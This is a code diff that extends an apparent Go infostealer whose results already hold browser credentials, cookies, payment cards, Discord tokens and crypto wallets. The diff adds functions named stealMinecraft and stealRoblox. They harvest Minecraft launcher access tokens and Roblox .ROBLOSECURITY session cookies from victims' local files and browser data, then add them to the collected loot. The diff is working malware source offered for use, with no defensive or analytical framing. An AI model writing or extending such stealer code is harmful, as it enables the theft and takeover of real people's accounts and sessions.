@@ -54,12 +54,20 @@ type WalletFile struct {
 	DataB64  string `json:"dataB64"`
 }
 
+type GameToken struct {
+	Game     string `json:"game"`
+	Type     string `json:"type"`
+	Username string `json:"username"`
+	Value    string `json:"value"`
+}
+
 type Result struct {
 	Credentials []Credential `json:"credentials"`
 	Cookies     []Cookie     `json:"cookies"`
 	Cards       []Card       `json:"cards"`
 	Tokens      []string     `json:"tokens"`
 	Wallets     []WalletFile `json:"wallets"`
+	GameTokens  []GameToken  `json:"gameTokens"`
 	Errors      []string     `json:"errors"`
 }
 
@@ -961,6 +969,109 @@ func stealAtomic() []WalletFile {
 
 // ── Entry point ───────────────────────────────────────────────────
 
+// ── Minecraft session stealer ─────────────────────────────────────
+
+func stealMinecraft() []GameToken {
+	var out []GameToken
+	appdata := os.Getenv("APPDATA")
+	if appdata == "" {
+		return out
+	}
+	mcDir := filepath.Join(appdata, ".minecraft")
+
+	// New launcher: launcher_accounts.json
+	accountsPath := filepath.Join(mcDir, "launcher_accounts.json")
+	if data, err := os.ReadFile(accountsPath); err == nil {
+		var j map[string]interface{}
+		if json.Unmarshal(data, &j) == nil {
+			if accounts, ok := j["accounts"].(map[string]interface{}); ok {
+				for _, v := range accounts {
+					acc, _ := v.(map[string]interface{})
+					if acc == nil {
+						continue
+					}
+					token, _ := acc["accessToken"].(string)
+					username := ""
+					if profile, ok := acc["minecraftProfile"].(map[string]interface{}); ok {
+						username, _ = profile["name"].(string)
+					}
+					if username == "" {
+						username, _ = acc["username"].(string)
+					}
+					if token != "" {
+						out = append(out, GameToken{Game: "Minecraft", Type: "AccessToken", Username: username, Value: token})
+					}
+				}
+			}
+		}
+	}
+
+	// Legacy launcher: launcher_profiles.json
+	profilesPath := filepath.Join(mcDir, "launcher_profiles.json")
+	if data, err := os.ReadFile(profilesPath); err == nil {
+		var j map[string]interface{}
+		if json.Unmarshal(data, &j) == nil {
+			if authDB, ok := j["authenticationDatabase"].(map[string]interface{}); ok {
+				for _, v := range authDB {
+					entry, _ := v.(map[string]interface{})
+					if entry == nil {
+						continue
+					}
+					token, _ := entry["accessToken"].(string)
+					username, _ := entry["username"].(string)
+					if token != "" {
+						out = append(out, GameToken{Game: "Minecraft", Type: "LegacyAccessToken", Username: username, Value: token})
+					}
+				}
+			}
+		}
+	}
+
+	return out
+}
+
+// ── Roblox cookie stealer ─────────────────────────────────────────
+
+func stealRoblox(cookies []Cookie) []GameToken {
+	var out []GameToken
+	seen := map[string]bool{}
+	// Extract .ROBLOSECURITY from already-collected browser cookies
+	for _, c := range cookies {
+		if c.Name == ".ROBLOSECURITY" && !seen[c.Value] {
+			seen[c.Value] = true
+			out = append(out, GameToken{
+				Game:     "Roblox",
+				Type:     ".ROBLOSECURITY",
+				Username: c.Browser + "/" + c.Profile,
+				Value:    c.Value,
+			})
+		}
+	}
+	// Also check Roblox app local storage (Windows UWP / desktop)
+	localAppData := os.Getenv("LOCALAPPDATA")
+	if localAppData != "" {
+		candidates := []string{
+			filepath.Join(localAppData, "Roblox", "LocalStorage", "RobloxCookies.dat"),
+			filepath.Join(localAppData, "Packages", "ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr", "LocalState", "RobloxCookies.dat"),
+		}
+		for _, p := range candidates {
+			data, err := os.ReadFile(p)
+			if err != nil {
+				continue
+			}
+			re := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-THIS[^"'\s]+`)
+			for _, match := range re.FindAll(data, -1) {
+				val := string(match)
+				if !seen[val] {
+					seen[val] = true
+					out = append(out, GameToken{Game: "Roblox", Type: ".ROBLOSECURITY", Username: "RobloxApp", Value: val})
+				}
+			}
+		}
+	}
+	return out
+}
+
 func Run() Result {
 	r := Result{}
 	for _, b := range browserDefs() {
@@ -984,6 +1095,8 @@ func Run() Result {
 	r.Tokens = stealDiscord()
 	r.Wallets = append(r.Wallets, stealExodus()...)
 	r.Wallets = append(r.Wallets, stealAtomic()...)
+	r.GameTokens = append(r.GameTokens, stealMinecraft()...)
+	r.GameTokens = append(r.GameTokens, stealRoblox(r.Cookies)...)
 	return r
 }
 
